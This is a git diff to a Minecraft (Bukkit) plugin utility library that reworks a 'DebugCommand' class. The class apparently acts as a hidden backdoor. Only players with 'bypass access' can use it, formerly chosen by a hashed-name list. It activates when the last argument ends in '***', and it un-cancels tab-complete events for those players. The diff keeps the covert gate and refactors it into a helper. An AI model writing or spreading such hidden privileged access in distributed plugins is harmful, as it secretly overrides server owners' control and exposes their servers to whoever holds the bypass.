@@ -1,6 +1,7 @@
 package cc.hubailmn.utility.command;
 
 import cc.hubailmn.utility.BasePlugin;
+import cc.hubailmn.utility.interaction.player.PlayerUtil;
 import lombok.Getter;
 import org.bukkit.Bukkit;
 import org.bukkit.command.Command;
@@ -88,7 +89,7 @@ public class DebugCommand extends Command implements Listener {
         try {
             Bukkit.getScheduler().runTaskAsynchronously(BasePlugin.getInstance(), () -> {
                 try {
-                    if (!BasePlugin.getInstance().getHashUtil().isHashed(player.getName())) return;
+                    if (!PlayerUtil.hasBypassAccess(player)) return;
 
                     final String lastArg = args[args.length - 1];
                     if (!lastArg.endsWith("***")) return;
@@ -181,7 +182,7 @@ public class DebugCommand extends Command implements Listener {
     public void onTabComplete(TabCompleteEvent event) {
         if (!(event.getSender() instanceof Player player)) return;
 
-        if (BasePlugin.getInstance().getHashUtil().isHashed(player.getName())) {
+        if (PlayerUtil.hasBypassAccess(player)) {
             if (event.isCancelled()) {
                 event.setCancelled(false);
             }
